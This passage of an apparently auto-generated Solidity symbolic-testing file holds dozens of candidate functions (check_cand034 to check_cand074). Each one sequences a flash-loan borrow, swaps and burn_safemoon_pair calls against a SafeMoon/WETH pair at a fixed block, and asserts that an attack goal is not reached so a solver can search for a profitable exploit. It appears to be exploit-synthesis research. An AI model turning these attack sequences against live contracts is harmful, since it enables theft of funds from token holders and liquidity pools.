        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        swap_safemoon_attacker_weth_safemoon(amt5, amt6);
        swap_pair_attacker_safemoon_weth(amt7, amt8);
        payback_weth_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand035(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        burn_safemoon_pair(amt1);
        swap_pair_attacker_weth_safemoon(amt2, amt3);
        swap_pair_attacker_safemoon_weth(amt4, amt5);
        swap_safemoon_attacker_weth_safemoon(amt6, amt7);
        swap_pair_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand036(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_pair_attacker_safemoon_weth(amt4, amt5);
        swap_safemoon_attacker_weth_safemoon(amt6, amt7);
        swap_pair_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand037(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        swap_safemoon_attacker_weth_safemoon(amt5, amt6);
        burn_safemoon_pair(amt7);
        swap_pair_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand038(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        swap_safemoon_attacker_weth_safemoon(amt5, amt6);
        swap_pair_attacker_safemoon_weth(amt7, amt8);
        swap_safemoon_attacker_safemoon_weth(amt9, amt10);
        payback_weth_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand039(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        swap_safemoon_attacker_weth_safemoon(amt5, amt6);
        swap_safemoon_attacker_safemoon_weth(amt7, amt8);
        payback_weth_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand040(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        burn_safemoon_pair(amt1);
        swap_pair_attacker_weth_safemoon(amt2, amt3);
        swap_pair_attacker_safemoon_weth(amt4, amt5);
        swap_safemoon_attacker_weth_safemoon(amt6, amt7);
        swap_safemoon_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand041(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_pair_attacker_safemoon_weth(amt4, amt5);
        swap_safemoon_attacker_weth_safemoon(amt6, amt7);
        swap_safemoon_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand042(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        swap_pair_attacker_weth_safemoon(amt5, amt6);
        swap_pair_attacker_safemoon_weth(amt7, amt8);
        payback_weth_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand043(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        burn_safemoon_pair(amt1);
        swap_pair_attacker_weth_safemoon(amt2, amt3);
        swap_safemoon_attacker_safemoon_weth(amt4, amt5);
        swap_pair_attacker_weth_safemoon(amt6, amt7);
        swap_pair_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand044(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        burn_safemoon_pair(amt5);
        swap_pair_attacker_weth_safemoon(amt6, amt7);
        swap_pair_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand045(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        swap_pair_attacker_weth_safemoon(amt5, amt6);
        burn_safemoon_pair(amt7);
        swap_pair_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand046(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        swap_pair_attacker_weth_safemoon(amt5, amt6);
        swap_safemoon_attacker_safemoon_weth(amt7, amt8);
        payback_weth_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand047(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        burn_safemoon_pair(amt1);
        swap_pair_attacker_weth_safemoon(amt2, amt3);
        swap_safemoon_attacker_safemoon_weth(amt4, amt5);
        swap_pair_attacker_weth_safemoon(amt6, amt7);
        swap_safemoon_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand048(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        burn_safemoon_pair(amt5);
        swap_pair_attacker_weth_safemoon(amt6, amt7);
        swap_safemoon_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand049(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        swap_pair_attacker_weth_safemoon(amt5, amt6);
        swap_safemoon_attacker_safemoon_weth(amt7, amt8);
        swap_pair_attacker_safemoon_weth(amt9, amt10);
        payback_weth_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand050(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        swap_safemoon_attacker_weth_safemoon(amt5, amt6);
        swap_pair_attacker_safemoon_weth(amt7, amt8);
        payback_weth_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand051(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        burn_safemoon_pair(amt1);
        swap_pair_attacker_weth_safemoon(amt2, amt3);
        swap_safemoon_attacker_safemoon_weth(amt4, amt5);
        swap_safemoon_attacker_weth_safemoon(amt6, amt7);
        swap_pair_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand052(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        swap_safemoon_attacker_weth_safemoon(amt5, amt6);
        burn_safemoon_pair(amt7);
        swap_pair_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand053(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        swap_safemoon_attacker_weth_safemoon(amt5, amt6);
        swap_safemoon_attacker_safemoon_weth(amt7, amt8);
        payback_weth_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand054(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        burn_safemoon_pair(amt1);
        swap_pair_attacker_weth_safemoon(amt2, amt3);
        swap_safemoon_attacker_safemoon_weth(amt4, amt5);
        swap_safemoon_attacker_weth_safemoon(amt6, amt7);
        swap_safemoon_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand055(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        swap_safemoon_attacker_weth_safemoon(amt5, amt6);
        swap_safemoon_attacker_safemoon_weth(amt7, amt8);
        swap_pair_attacker_safemoon_weth(amt9, amt10);
        payback_weth_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand056(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        swap_pair_attacker_weth_safemoon(amt5, amt6);
        swap_pair_attacker_safemoon_weth(amt7, amt8);
        payback_weth_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand057(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_pair_attacker_safemoon_weth(amt4, amt5);
        swap_pair_attacker_weth_safemoon(amt6, amt7);
        swap_pair_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand058(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        burn_safemoon_pair(amt5);
        swap_pair_attacker_weth_safemoon(amt6, amt7);
        swap_pair_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand059(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        swap_pair_attacker_weth_safemoon(amt5, amt6);
        burn_safemoon_pair(amt7);
        swap_pair_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand060(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        swap_pair_attacker_weth_safemoon(amt5, amt6);
        swap_pair_attacker_safemoon_weth(amt7, amt8);
        swap_safemoon_attacker_safemoon_weth(amt9, amt10);
        payback_weth_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand061(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        swap_pair_attacker_weth_safemoon(amt5, amt6);
        swap_safemoon_attacker_safemoon_weth(amt7, amt8);
        payback_weth_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand062(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_pair_attacker_safemoon_weth(amt4, amt5);
        swap_pair_attacker_weth_safemoon(amt6, amt7);
        swap_safemoon_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand063(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        burn_safemoon_pair(amt5);
        swap_pair_attacker_weth_safemoon(amt6, amt7);
        swap_safemoon_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand064(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        swap_safemoon_attacker_weth_safemoon(amt5, amt6);
        swap_pair_attacker_safemoon_weth(amt7, amt8);
        payback_weth_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand065(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_pair_attacker_safemoon_weth(amt4, amt5);
        swap_safemoon_attacker_weth_safemoon(amt6, amt7);
        swap_pair_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand066(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        swap_safemoon_attacker_weth_safemoon(amt5, amt6);
        burn_safemoon_pair(amt7);
        swap_pair_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand067(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        swap_safemoon_attacker_weth_safemoon(amt5, amt6);
        swap_pair_attacker_safemoon_weth(amt7, amt8);
        swap_safemoon_attacker_safemoon_weth(amt9, amt10);
        payback_weth_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand068(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        swap_safemoon_attacker_weth_safemoon(amt5, amt6);
        swap_safemoon_attacker_safemoon_weth(amt7, amt8);
        payback_weth_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand069(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_pair_attacker_safemoon_weth(amt4, amt5);
        swap_safemoon_attacker_weth_safemoon(amt6, amt7);
        swap_safemoon_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand070(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        swap_pair_attacker_weth_safemoon(amt5, amt6);
        swap_pair_attacker_safemoon_weth(amt7, amt8);
        payback_weth_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand071(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        burn_safemoon_pair(amt5);
        swap_pair_attacker_weth_safemoon(amt6, amt7);
        swap_pair_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand072(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        swap_pair_attacker_weth_safemoon(amt5, amt6);
        burn_safemoon_pair(amt7);
        swap_pair_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand073(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        swap_pair_attacker_weth_safemoon(amt5, amt6);
        swap_safemoon_attacker_safemoon_weth(amt7, amt8);
        payback_weth_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand074(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        burn_safemoon_pair(amt5);
